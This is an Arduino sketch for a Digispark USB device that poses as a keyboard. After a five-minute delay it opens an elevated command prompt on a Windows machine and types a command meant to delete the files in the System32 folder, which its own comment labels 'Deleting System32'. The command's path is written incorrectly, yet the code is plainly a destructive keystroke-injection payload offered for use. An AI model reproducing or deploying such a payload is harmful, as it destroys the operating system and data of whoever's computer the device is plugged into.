#include<DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // Deleting System32
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("del C:Windows\System32\*.*\q ");
  digitalWrite(1, HIGH);//this will start second redlight if program finished it's job
  for(;;){
    // Hello there!!
  }
}
